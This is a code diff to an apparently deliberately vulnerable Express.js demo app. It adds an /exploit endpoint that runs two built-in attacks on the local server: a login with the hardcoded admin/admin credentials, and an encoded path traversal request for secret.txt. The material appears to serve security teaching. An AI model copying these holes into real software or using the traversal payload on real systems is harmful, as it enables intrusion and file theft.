@@ -1,13 +1,66 @@
 const express = require('express')
 const fs = require('fs');
 const path = require('path');
+const fetch = require('node-fetch');
 const app = express()
 const port = 3000
 
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, 'public')));
+app.use(express.json());
 
 app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
+});
+
+async function defaultCreds() {
+  try {
+    const response = await fetch('http://localhost:3000/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+      },
+      body: JSON.stringify({ username: 'admin', password: 'admin' }),
+    });
+    if (!response.ok) {
+      return `Error: ${response.statusText}`;
+    }
+    const result = await response.text();
+    return result;
+  } catch (error) {
+    return `Request failed: ${error.message}`;
+  }
+}
+
+async function pathTraversal() {
+  try {
+    const response = await fetch('http://localhost:3000/pathtraversal/..%2F..%2F..%2Fsecret.txt');
+    if (!response.ok) {
+      return `Error: ${response.statusText}`;
+    }
+    const result = await response.text();
+    return result;
+  } catch (error) {
+    return `Request failed: ${error.message}`;
+  }
+}
+
+app.post('/exploit', async (req, res) => {
+  let { exploitType } = req.body;
+  try {
+    if (exploitType === "Path Traversal") {
+      let result = await pathTraversal();
+      res.send(result);
+    } else if (exploitType === "Default Credentials") {
+      let result = await defaultCreds();
+      res.send(result);
+    } else {
+      res.send("Strange server error. This exploit doesnt exist.")
+    }
+  } catch (error) {
+    res.send(`Request from server failed: ${error.message}`);
+  }
+
 });
 
 app.get('/pathtraversal', (req, res) => {
@@ -24,11 +77,15 @@ app.get('/pathtraversal/*', (req, res) => {
 })
 
 app.get('/login', (req, res) => {
-  let { username, password } = req.query;
+  res.sendFile(path.join(__dirname, 'public', 'login.html'));
+});
+
+app.post('/login', (req, res) => {
+  let { username, password } = req.body;
   if (username === 'admin' && password === 'admin') {
-    res.send('Successful login to admin account.');
+    res.sendFile(path.join(__dirname, 'public', 'success.html'));
   } else {
-    res.send('Login failed. Invalid username or password.');
+    res.sendFile(path.join(__dirname, 'public', 'failed.html'));
   }
 });
 
